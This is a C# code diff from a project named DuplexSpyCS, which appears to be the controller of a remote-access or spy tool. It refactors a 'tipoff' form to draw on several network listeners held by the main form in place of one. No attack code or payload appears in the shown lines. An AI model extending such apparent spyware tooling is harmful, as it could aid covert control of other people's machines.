@@ -38,7 +38,8 @@ namespace DuplexSpyCS
          * .o0o.---------------[ README ]---------------.o0o.
          */
 
-        private clsTcpListener m_listener;
+        private frmMain m_frmMain { get; init; }
+        private Dictionary<string, clsListener> m_dicListener => m_frmMain.m_dicListener;
 
         /// <summary>
         /// Send request mode.
@@ -75,11 +76,11 @@ namespace DuplexSpyCS
         public List<ILiveDevice> m_lsDevice;
         public List<NetworkInterface> m_lsNetworkInterface;
 
-        public frmTipoff(clsTcpListener l)
+        public frmTipoff(frmMain frmMain)
         {
-            m_listener = l;
-
             InitializeComponent();
+
+            m_frmMain = frmMain;
         }
 
         private RequestMode fnGetRequestMode() => (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
@@ -390,7 +391,7 @@ namespace DuplexSpyCS
         void fnSetup()
         {
             //Controls
-            if (m_listener == null)
+            if (m_dicListener.Count == 0)
             {
                 MessageBox.Show("Not listening port found.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
@@ -399,7 +400,7 @@ namespace DuplexSpyCS
                 try
                 {
                     textBox1.Text = "127.0.0.1";
-                    numericUpDown2.Value = m_listener.m_nPort;
+                    numericUpDown2.Value = m_dicListener.Values.First().m_nPort;
                 }
                 catch
                 {
